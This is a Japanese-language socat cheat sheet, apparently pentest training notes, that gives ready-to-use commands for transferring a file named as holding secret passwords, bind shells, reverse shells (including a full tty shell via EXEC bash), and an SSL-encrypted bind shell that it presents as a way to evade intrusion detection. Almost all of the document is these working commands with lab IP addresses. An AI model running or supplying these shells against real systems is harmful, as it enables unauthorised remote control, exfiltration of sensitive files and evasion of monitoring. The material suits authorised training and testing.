# Socat

### ファイル転送

* 転送するファイルを指定する

  ```
  # kali
  sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
  ```

  * fork ：リスナーに接続されると子プロセスを作成する

* ファイルを取得する

  ```
  # windows
  socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
  ```



### バインドシェル

```bash
# client
socat - TCP4:<remote server's ip address>:80

# listener
sudo socat TCP4-LISTEN:443 STDOUT
```



### リバースシェル

```bash
# listener
socat -d -d TCP4-LISTEN:443 STDOUT

# sender
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```



### リバースシェル(tty)

```bash
# listener
socat file:`tty`,raw,echo=0 tcp-listen:60000

# sender
socat TCP4:192.168.119.175:60000 exec:'bash -li',pty,stderr,setsid,sigint,sane
```



### 暗号化バインドシェル

バインドシェルに暗号化を加えるには、Secure Socket Layer1 証明書を使用する
侵入検知システム (IDS)2の回避に役立ち、転送される機密データを隠すのに役立つ

* 自己署名証明書を作成する

  ```
  openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
  ```

  * req: 新しい証明書署名要求を開始する
  * -newkey: 新しい秘密鍵を生成する
  * rsa:2048: 2,048 ビットの鍵長で RSA 暗号を使用します。
  * -nodes: パスフレーズ保護なしで秘密鍵を保存します。
  * -keyout: 鍵をファイルに保存する
  * -x509: 証明書要求の代わりに自己署名入り証明書を出力する
  * -days: 有効期限を日数で設定
  * -out: 証明書をファイルに保存

* 鍵を生成したら、証明書とその秘密鍵をファイルにcatする

  ```
  cat bind_shell.key bind_shell.crt > bind_shell.pem
  ```

* バインドシェルプロセスを作成する

  ```
  # kali
  sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
  ```

  OPENSSL-LISTEN オプションを使用してポート 443 にリスナーを作成し、 cert=bind_shell.pem で証明書ファイルを指定し、 verify で SSL 検証を無効にし、 fork でリスナーに接続

* バインドシェルを接続する

  ```
  # windows
  socat - OPENSSL:10.11.0.4:443,verify=0
  ```

  

  

